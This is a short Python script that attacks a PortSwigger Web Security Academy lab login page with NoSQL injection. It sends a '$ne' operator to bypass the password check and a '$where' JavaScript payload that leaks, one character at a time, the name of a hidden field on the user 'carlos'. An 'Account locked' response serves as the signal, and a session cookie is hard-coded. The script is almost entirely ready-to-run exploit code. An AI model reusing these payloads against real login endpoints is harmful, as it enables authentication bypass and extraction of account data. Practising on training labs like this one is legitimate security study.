#!/usr/bin/env python3
import requests
import string

url = "https://0ac0009404a041e98218797d00cb006e.web-security-academy.net/login"
headers = {
    "Cookie": "session=CInUWYnpHEMIbjBVttgAfw3X7oTxjSRc",
    "Content-Type": "application/json"
}

# Check position 5 (after 'reset')
position = 5
charset = string.ascii_uppercase + string.digits + "_-"

print(f"Checking position {position} after 'reset'...")

for char in charset:
    if char in ".*+?[]{}()^$|\\":
        char = "\\" + char

    payload = {
        "username": "carlos",
        "password": {"$ne": "invalid"},
        "$where": f"Object.keys(this)[4].match('^.{{{position}}}{char}.*')"
    }

    response = requests.post(url, headers=headers, json=payload)
    if "Account locked" in response.text:
        print(f"Found: Position {position} is '{char.replace(chr(92), '')}'")
        break
else:
    print(f"Could not find character at position {position}")